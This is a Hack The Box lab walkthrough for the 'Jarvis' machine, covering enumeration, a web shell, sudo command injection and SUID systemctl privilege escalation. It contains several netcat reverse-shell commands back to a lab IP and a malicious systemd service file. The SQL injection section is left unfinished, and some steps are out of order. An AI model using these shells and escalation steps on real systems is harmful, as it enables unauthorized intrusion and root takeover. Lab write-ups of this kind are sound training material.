Jarvis HTB walkthrough
*******************************

Nmap
#########

To start off we run a nmap scan

.. code-block:: console

	PORT      STATE SERVICE VERSION 

	22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) 

	| ssh-hostkey:  

	|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA) 

	|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA) 

	|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519) 

	80/tcp    open  http    Apache httpd 2.4.25 ((Debian)) 

	|_http-server-header: Apache/2.4.25 (Debian) 

	| http-cookie-flags:  

	|   /:  

	|     PHPSESSID:  

	|_      httponly flag not set 

	|_http-title: Stark Hotel 

	64999/tcp open  http    Apache httpd 2.4.25 ((Debian)) 

	|_http-server-header: Apache/2.4.25 (Debian) 

	|_http-title: Site doesn't have a title (text/html). 

	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 

We discover ports `80` and `64999` are open.

Enumerating port 80
#########################

We then enumerate port 80 by running dirbuster. This can also be done with gobuster.

.. code-block:: console

	dirb http://jarvis -w /usr/share/wordlists/dirb/common.txt
	+ http://jarvis/index.php (CODE:200|SIZE:23628)            
	 ==> DIRECTORY: http://jarvis/phpmyadmin/ 
	http://jarvis/room.php

Enumerating port 64999
#############################

When you go to `http://jarvis:64999/` it just gives you the text  

	Hey you have been banned for 90 seconds, don't be bad 

SQL Injection 
###################

When we go to room.php we can see that it specifies a number: *http://jarvis/room.php?cod=1* . When we run *http://jarvis/room.php?cod='* it does not display any hotel information.

*ADD MORE STUFF*

Inital Shell
##################

Go to this website to create the shell

.. code-block:: console

	http://supersecurehotel.htb/shell.php?cmd=nc -e /bin/bash 10.10.14.20 4444 

We then run this command to see what commands we can execute as sudo

.. code-block:: console

	sudo –l 
	(pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py 

We can see that as pepper, we can execute simpler.py as root.

To make are shell prettier we execute this command

..code-block:: console

	python -c 'import pty; pty.spawn("/bin/bash")' 

More Shell Access
+++++++++++++++++++++

We then run the following command to get more access within the shell 

..code-block:: console

	sudo -u pepper /var/www/Admin-Utilities/simpler.py -p 
	Enter an IP: $(bash) 
	pepper@jarvis:~$ nc -e /bin/bash 10.10.14.20 4443 

We then listen to the port with netcat and we should have more commands we can execute

..code-block:: console

	Nc –lvnp 4443 

PE
##################

We then moved Linenum.sh onto machine and found the SSUID 


.. code-block:: console

	./LinEnum.sh -t 
	/bin/fusermount 
	/bin/mount 
	/bin/ping 
	/bin/systemctl 
	/bin/umount 
	/bin/su 
	/usr/bin/newgrp 
	/usr/bin/passwd 
	/usr/bin/gpasswd 
	/usr/bin/chsh 
	/usr/bin/sudo 
	/usr/bin/chfn 
	/usr/lib/eject/dmcrypt-get-device 
	/usr/lib/openssh/ssh-keysign 
	/usr/lib/dbus-1.0/dbus-daemon-launch-helper 

Exploit SUID
+++++++++++++++++
	 
We see that systemctl is SUID exploitable. So we then go to `/tmp` and create the exploit.
 
.. code-block:: console

	cd /tmp 
	cp mynameis.service /home/pepper 
	vi mynameis.service 
	[Service] Type=notify ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.14.20 4441' KillMode=process Restart=on-failure RestartSec=42s [Install] WantedBy=multi-user.target 

We  transffered it to jarvis and get root 

.. code-block:: console

	/bin/systemctl link /home/pepper/mynameis.service 
	/bin/systemctl enable –now mynameis.service; /bin/systemctl start mynameis.service 
	Nc –lvnp 4441 # attacker machine 

There we can see root.txt which is *d41d8cd98f00b204e9800998ecf84271*  
